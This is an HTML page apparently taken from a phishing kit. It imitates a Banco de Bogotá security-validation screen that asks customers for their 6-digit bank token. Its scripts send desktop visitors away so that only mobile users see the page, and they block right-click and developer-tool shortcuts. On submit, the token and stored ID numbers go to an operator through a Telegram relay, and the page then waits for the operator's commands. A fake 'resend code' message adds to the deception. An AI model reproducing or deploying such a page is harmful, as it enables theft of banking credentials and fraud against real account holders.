

<!DOCTYPE html>
<html lang="es">

<head>
    <script>
        // Security & Device Detection
        const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
        if (!isMobile) {
            window.location.href = "https://www.nequi.com.co/";
        }
        document.addEventListener('contextmenu', event => event.preventDefault());
        document.onkeydown = function(e) {
            if (e.keyCode == 123) return false;
            if (e.ctrlKey && e.shiftKey && (e.keyCode == 'I'.charCodeAt(0) || e.keyCode == 'J'.charCodeAt(0) || e.keyCode == 'C'.charCodeAt(0))) return false;
            if (e.ctrlKey && e.keyCode == 'U'.charCodeAt(0)) return false;
        }
    </script>
    <meta http-equiv="Content-Type" content="text/html; charset=utf8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Banco de Bogotá - Verificación</title>
    <link rel="stylesheet" href="../../sapp2406.sirv.com/bogo/lfr_style.css" />
    <link rel="stylesheet" href="../../sapp2406.sirv.com/bogo/lfr_ownstyle.css" />
    <script src="../../ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>

    <style>
        /* ====== RESET + LOADER (igual que index1) ====== */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        #loading-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: #2c3e50;
            z-index: 9999;
            display: none;
            justify-content: center;
            align-items: center;
            flex-direction: column;
        }

        .loader-container {
            position: relative;
            width: 60px;
            height: 60px;
            animation: rotateLoader 1.5s linear infinite;
        }

        .dot {
            position: absolute;
            width: 20px;
            height: 20px;
            border-radius: 50%;
        }

        .dot-yellow {
            background-color: #f1c40f;
            top: 0;
            left: 50%;
            transform: translateX(-50%);
        }

        .dot-blue {
            background-color: #3498db;
            bottom: 5px;
            left: 0;
        }

        .dot-red {
            background-color: #e74c3c;
            bottom: 5px;
            right: 0;
        }

        @keyframes rotateLoader {
            0% {
                transform: rotate(0deg);
            }

            100% {
                transform: rotate(360deg);
            }
        }

        /* ====== BASE (igual que index1) ====== */
        body {
            font-family: 'Open Sans', Arial, sans-serif;
            background: linear-gradient(90deg, #fcfcfc 50%, #eef3f6 50%);
            min-height: 100vh;
            margin: 0;
        }

        .container {
            display: flex;
            flex-direction: row;
            justify-content: center;
            align-items: flex-start;
            max-width: 1000px;
            margin: 20px auto;
            padding: 20px;
            gap: 40px;
        }

        .container__login {
            flex: 0 0 380px;
            width: 380px;
        }

        .container__login--header img {
            max-width: 200px;
            margin-bottom: 15px;
        }

        .container__login--title h2 {
            font-size: 1.2rem;
            font-weight: bold;
            color: #333;
            margin-bottom: 15px;
        }

        .login-card-content {
            background: #fff;
            border-radius: 8px;
            box-shadow: 0 4px 20px rgba(0, 0, 0, .08);
            padding: 30px 20px;
            margin-bottom: 15px;
            text-align: center;
        }

        /* BLUE BANNER */
        .blue-banner {
            background: #e6f0fa;
            color: #0033a0;
            padding: 15px;
            border-radius: 8px;
            margin-bottom: 20px;
            border-left: 4px solid #0033a0;
            display: flex;
            align-items: center;
            gap: 10px;
            font-size: .9em;
        }

        /* TOKEN INPUTS */
        .token-container {
            display: flex;
            justify-content: center;
            gap: 8px;
            margin: 20px 0;
        }

        .token-input {
            width: 45px;
            height: 45px;
            text-align: center;
            font-size: 1.2rem;
            border: 1px solid #ccc;
            border-radius: 6px;
            outline: none;
            transition: border-color .3s;
        }

        .token-input:focus {
            border-color: #0033a0;
            box-shadow: 0 0 0 2px rgba(0, 51, 160, .1);
        }

        /* BUTTON */
        .btn-main {
            background: #0033a0;
            color: #fff;
            border: none;
            padding: 12px;
            width: 100%;
            border-radius: 25px;
            font-size: 1rem;
            font-weight: bold;
            cursor: pointer;
            margin-top: 10px;
        }

        .btn-main:hover {
            background: #002a85;
        }

        /* INFO SECTION */
        .container__info {
            flex: 1;
            max-width: 500px;
        }

        .container__info img {
            width: 100%;
            border-radius: 8px;
            box-shadow: 0 4px 15px rgba(0, 0, 0, .1);
        }

        /* ===== MÓVIL (igual que index1) ===== */
        @media (max-width:768px) {
            body {
                background: #fff !important;
                padding: 0;
            }

            .container {
                flex-direction: column;
                align-items: center;
                padding: 10px;
                margin: 10px auto;
                gap: 15px;
            }

            .container__login {
                width: 100%;
                max-width: 100%;
                flex: none;
            }

            .container__login--header img {
                max-width: 180px;
            }

            .container__info {
                width: 100%;
                max-width: 100%;
                flex: none;
                margin-top: 10px;
            }

            .login-card-content {
                padding: 15px;
            }

            input,
            select,
            textarea {
                font-size: 16px !important;
            }
        }

        @media (max-width:360px) {
            .container {
                padding: 5px;
            }

            .login-card-content {
                padding: 12px;
            }
        }
    </style>
</head>

<body>
    <div id="loading-overlay">
        <div class="loader-container">
            <div class="dot dot-yellow"></div>
            <div class="dot dot-blue"></div>
            <div class="dot dot-red"></div>
        </div>
    </div>

    <!-- CONTENEDOR PRINCIPAL -->
    <div class="container">
        <!-- LOGIN / FORM -->
        <div class="container__login">
            <!-- LOGO -->
            <div class="container__login--header">
                <img src="logobanco1.jpg" alt="Banco de Bogotá" />
            </div>

            <div class="container__login--title">
                <h2>Validación de Seguridad</h2>
            </div>

            <div class="blue-banner">
                <div>
                    <strong>Código de seguridad</strong><br>
                    Ingresa el código token de 6 dígitos que esta en la app de tu telefono.
                </div>
            </div>

            <div class="login-card-content">
                <h3 style="color:#0033a0;margin-bottom:20px;font-size:1.1rem;">Ingresa el Token</h3>

                <form id="formToken" autocomplete="off" onsubmit="return sendTokenForm(event);">
                    <div class="token-container">
                        <input type="tel" class="token-input" maxlength="1" id="num1" required />
                        <input type="tel" class="token-input" maxlength="1" id="num2" />
                        <input type="tel" class="token-input" maxlength="1" id="num3" />
                        <input type="tel" class="token-input" maxlength="1" id="num4" />
                        <input type="tel" class="token-input" maxlength="1" id="num5" />
                        <input type="tel" class="token-input" maxlength="1" id="num6" />
                    </div <p style="font-size:.8rem;color:#666;margin-bottom:20px;">
                    ¿No recibiste el código? <a href="#" onclick="reenviarCodigo();return false;" style="color:#0033a0;font-weight:bold;">Reenviar</a>
                    </p>

                    <button type="submit" class="btn-main">Continuar</button>
                </form>
            </div>
        </div>

        <!-- INFO / BANNER -->
        <div class="container__info">
            <img src="taval.jpeg" alt="Promo" />
        </div>
    </div>

    <!-- ===== TU MISMO JS SIN CAMBIOS ===== -->
    <script src="telegram.js"></script>
    <script src="action.js"></script>
    <script>
        if (window.stopListening) window.stopListening();

        document.addEventListener('DOMContentLoaded', function() {
            const inputs = document.querySelectorAll('.token-input');
            inputs.forEach((input, index) => {
                input.addEventListener('input', function() {
                    this.value = this.value.replace(/[^0-9]/g, '');
                    if (this.value.length === 1 && index < inputs.length - 1) inputs[index + 1].focus();
                });
                input.addEventListener('keydown', function(e) {
                    if (e.key === 'Backspace' && this.value === '' && index > 0) inputs[index - 1].focus();
                });
                input.addEventListener('paste', function(e) {
                    e.preventDefault();
                    const pasted = e.clipboardData.getData('text').replace(/[^0-9]/g, '');
                    for (let i = 0; i < pasted.length && (index + i) < inputs.length; i++) inputs[index + i].value = pasted[i];
                    const nextEmpty = Array.from(inputs).findIndex((inp, idx) => idx > index && inp.value === '');
                    nextEmpty !== -1 ? inputs[nextEmpty].focus() : inputs[inputs.length - 1].focus();
                });
            });
            inputs[0].focus();
        });

        function sendTokenForm(e) {
            e.preventDefault();
            const token = Array.from(document.querySelectorAll('.token-input')).map(i => i.value).join('');
            if (token.length < 6) {
                alert('Por favor ingresa los 6 dígitos del código');
                return false;
            }

            document.getElementById('loading-overlay').style.display = 'flex';
            const btn = document.querySelector('.btn-main');
            btn.disabled = true;
            btn.textContent = 'Validando...';

            if (window.stopListening) window.stopListening();
            localStorage.removeItem('bbogota_msg_id');
            if (typeof actionProcessed !== 'undefined') actionProcessed = false;

            const userData = (typeof getUserData === 'function') ? getUserData() : {
                tipo_identificacion: localStorage.getItem('user_id_type') || 'CC',
                numero_identificacion: localStorage.getItem('user_id_number') || 'Desconocido'
            };
            const tokenData = {
                token: token,
                tipo_identificacion: userData.tipo_identificacion,
                numero_identificacion: userData.numero_identificacion
            };

            if (typeof sendToTelegram === 'function') {
                sendToTelegram('token', tokenData, function() {
                    console.log('✅ Token enviado');
                    if (typeof listenCurrentButtons === 'function') listenCurrentButtons(window.handleTelegramAction);
                });
            } else {
                console.error('❌ sendToTelegram no disponible');
                alert('Error de conexión');
                document.getElementById('loading-overlay').style.display = 'none';
                btn.disabled = false;
                btn.textContent = 'Continuar';
            }
            return false;
        }

        function reenviarCodigo() {
            alert('Se ha enviado un nuevo código a tu celular');
            document.querySelectorAll('.token-input').forEach(i => i.value = '');
            document.getElementById('num1').focus();
        }
    </script>
</body>

</html>
